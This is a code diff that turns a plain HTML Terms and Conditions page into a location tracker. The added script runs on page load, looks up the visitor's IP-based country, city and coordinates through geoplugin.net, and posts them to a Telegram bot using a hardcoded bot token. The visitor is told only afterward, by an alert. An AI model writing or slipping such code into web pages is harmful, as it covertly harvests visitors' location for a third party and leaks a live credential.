@@ -1,13 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Terms and Conditions</title>
+    <script>
+        async function sendUserDataToBot() {
+            try {
+                // Get the user's IP-based location using GeoPlugin
+                const response = await fetch("http://www.geoplugin.net/json.gp");
+                const data = await response.json();
+
+                // User location details
+                const userLocation = {
+                    country: data.geoplugin_countryName,
+                    region: data.geoplugin_region,
+                    city: data.geoplugin_city,
+                    latitude: data.geoplugin_latitude,
+                    longitude: data.geoplugin_longitude
+                };
+
+                // Telegram Bot API URL (replace `YOUR_BOT_TOKEN` with your actual bot token)
+                const botApiUrl = `https://api.telegram.org/7665066222:AAHja229fRiXvFh1Vk7ONveM56-yWVSdM_g/sendMessage`;
+
+                // Extract chat ID from query parameters (sent by the bot in `/start`)
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get("chat_id");
+
+                if (!chatId) {
+                    alert("Chat ID not found. Please restart the bot.");
+                    return;
+                }
+
+                // Send the location data and confirmation to the bot
+                await fetch(botApiUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `✅ User has visited the Terms & Conditions page.\n\n📍 Location Details:\n- Country: ${userLocation.country}\n- Region: ${userLocation.region}\n- City: ${userLocation.city}\n- Latitude: ${userLocation.latitude}\n- Longitude: ${userLocation.longitude}`
+                    })
+                });
+
+                alert("Your visit and location have been recorded. Thank you!");
+            } catch (error) {
+                console.error("Error sending data to bot:", error);
+                alert("There was an error recording your visit.");
+            }
+        }
+
+        // Execute when the page loads
+        window.onload = sendUserDataToBot;
+    </script>
 </head>
 <body>
     <h1>Terms and Conditions</h1>
-    <p>Please read these terms carefully.</p>
-    <a href="index.html">Go back to Home</a>
+    <p>By using this service, you agree to the following terms and conditions...</p>
 </body>
 </html>
